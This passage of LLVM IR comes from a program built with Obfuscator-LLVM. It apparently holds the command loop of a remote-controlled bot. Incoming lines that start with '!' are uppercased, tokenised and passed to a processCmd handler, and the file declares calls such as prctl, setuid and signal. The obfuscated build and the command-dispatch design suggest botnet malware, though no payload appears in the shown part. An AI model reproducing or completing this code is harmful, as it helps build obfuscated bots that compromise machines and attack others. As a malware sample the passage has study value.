  %171 = call i8* @strstr(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = icmp eq i8* %171, %172
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %165
  br label %85

; <label>:175:                                    ; preds = %165
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %177 = call i8* @strstr(i8* %176, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = icmp eq i8* %177, %178
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %175
  call void @exit(i32 0) #12
  unreachable

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %182, i8** %15, align 8
  %183 = load i8*, i8** %15, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 33
  br i1 %186, label %187, label %339

; <label>:187:                                    ; preds = %181
  %188 = load i8*, i8** %15, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 1
  store i8* %189, i8** %16, align 8
  br label %190

; <label>:190:                                    ; preds = %202, %187
  %191 = load i8*, i8** %16, align 8
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp ne i32 %193, 32
  br i1 %194, label %195, label %200

; <label>:195:                                    ; preds = %190
  %196 = load i8*, i8** %16, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp ne i32 %198, 0
  br label %200

; <label>:200:                                    ; preds = %195, %190
  %201 = phi i1 [ false, %190 ], [ %199, %195 ]
  br i1 %201, label %202, label %205

; <label>:202:                                    ; preds = %200
  %203 = load i8*, i8** %16, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %16, align 8
  br label %190

; <label>:205:                                    ; preds = %200
  %206 = load i8*, i8** %16, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %205
  br label %85

; <label>:211:                                    ; preds = %205
  %212 = load i8*, i8** %16, align 8
  store i8 0, i8* %212, align 1
  %213 = load i8*, i8** %15, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  store i8* %214, i8** %16, align 8
  %215 = load i8*, i8** %15, align 8
  %216 = load i8*, i8** %16, align 8
  %217 = call i64 @strlen(i8* %216) #9
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = getelementptr inbounds i8, i8* %218, i64 2
  store i8* %219, i8** %15, align 8
  br label %220

; <label>:220:                                    ; preds = %240, %211
  %221 = load i8*, i8** %15, align 8
  %222 = load i8*, i8** %15, align 8
  %223 = call i64 @strlen(i8* %222) #9
  %224 = sub i64 %223, 1
  %225 = getelementptr inbounds i8, i8* %221, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 10
  br i1 %228, label %238, label %229

; <label>:229:                                    ; preds = %220
  %230 = load i8*, i8** %15, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = call i64 @strlen(i8* %231) #9
  %233 = sub i64 %232, 1
  %234 = getelementptr inbounds i8, i8* %230, i64 %233
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 13
  br label %238

; <label>:238:                                    ; preds = %229, %220
  %239 = phi i1 [ true, %220 ], [ %237, %229 ]
  br i1 %239, label %240, label %246

; <label>:240:                                    ; preds = %238
  %241 = load i8*, i8** %15, align 8
  %242 = load i8*, i8** %15, align 8
  %243 = call i64 @strlen(i8* %242) #9
  %244 = sub i64 %243, 1
  %245 = getelementptr inbounds i8, i8* %241, i64 %244
  store i8 0, i8* %245, align 1
  br label %220

; <label>:246:                                    ; preds = %238
  %247 = load i8*, i8** %15, align 8
  store i8* %247, i8** %17, align 8
  br label %248

; <label>:248:                                    ; preds = %260, %246
  %249 = load i8*, i8** %15, align 8
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp ne i32 %251, 32
  br i1 %252, label %253, label %258

; <label>:253:                                    ; preds = %248
  %254 = load i8*, i8** %15, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp ne i32 %256, 0
  br label %258

; <label>:258:                                    ; preds = %253, %248
  %259 = phi i1 [ false, %248 ], [ %257, %253 ]
  br i1 %259, label %260, label %263

; <label>:260:                                    ; preds = %258
  %261 = load i8*, i8** %15, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %15, align 8
  br label %248

; <label>:263:                                    ; preds = %258
  %264 = load i8*, i8** %15, align 8
  store i8 0, i8* %264, align 1
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  %267 = load i8*, i8** %17, align 8
  store i8* %267, i8** %18, align 8
  br label %268

; <label>:268:                                    ; preds = %272, %263
  %269 = load i8*, i8** %18, align 8
  %270 = load i8, i8* %269, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %281

; <label>:272:                                    ; preds = %268
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = call i32 @toupper(i32 %275) #9
  %277 = trunc i32 %276 to i8
  %278 = load i8*, i8** %18, align 8
  store i8 %277, i8* %278, align 1
  %279 = load i8*, i8** %18, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %18, align 8
  br label %268

; <label>:281:                                    ; preds = %268
  store i32 1, i32* %20, align 4
  %282 = load i8*, i8** %15, align 8
  %283 = call i8* @strtok(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %283, i8** %21, align 8
  %284 = load i8*, i8** %17, align 8
  %285 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %284, i8** %285, align 16
  br label %286

; <label>:286:                                    ; preds = %317, %281
  %287 = load i8*, i8** %21, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %319

; <label>:289:                                    ; preds = %286
  %290 = load i8*, i8** %21, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp ne i32 %292, 10
  br i1 %293, label %294, label %317

; <label>:294:                                    ; preds = %289
  %295 = load i8*, i8** %21, align 8
  %296 = call i64 @strlen(i8* %295) #9
  %297 = add i64 %296, 1
  %298 = call noalias i8* @malloc(i64 %297) #5
  %299 = load i32, i32* %20, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %300
  store i8* %298, i8** %301, align 8
  %302 = load i32, i32* %20, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = load i8*, i8** %21, align 8
  %307 = call i64 @strlen(i8* %306) #9
  %308 = add i64 %307, 1
  call void @llvm.memset.p0i8.i64(i8* %305, i8 0, i64 %308, i32 1, i1 false)
  %309 = load i32, i32* %20, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %310
  %312 = load i8*, i8** %311, align 8
  %313 = load i8*, i8** %21, align 8
  %314 = call i8* @strcpy(i8* %312, i8* %313) #5
  %315 = load i32, i32* %20, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %20, align 4
  br label %317

; <label>:317:                                    ; preds = %294, %289
  %318 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %318, i8** %21, align 8
  br label %286

; <label>:319:                                    ; preds = %286
  %320 = load i32, i32* %20, align 4
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %320, i8** %321)
  %322 = load i32, i32* %20, align 4
  %323 = icmp sgt i32 %322, 1
  br i1 %323, label %324, label %338

; <label>:324:                                    ; preds = %319
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %325

; <label>:325:                                    ; preds = %334, %324
  %326 = load i32, i32* %22, align 4
  %327 = load i32, i32* %20, align 4
  %328 = icmp slt i32 %326, %327
  br i1 %328, label %329, label %337

; <label>:329:                                    ; preds = %325
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  call void @free(i8* %333) #5
  br label %334

; <label>:334:                                    ; preds = %329
  %335 = load i32, i32* %22, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %22, align 4
  br label %325

; <label>:337:                                    ; preds = %325
  br label %338

; <label>:338:                                    ; preds = %337, %319
  br label %339

; <label>:339:                                    ; preds = %338, %181
  br label %85

; <label>:340:                                    ; preds = %85
  br label %341

; <label>:341:                                    ; preds = %340, %72
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146537462}
!2 = !{i32 -2146536334}
!3 = !{i32 -2146535643}
!4 = !{i32 -2146534894}
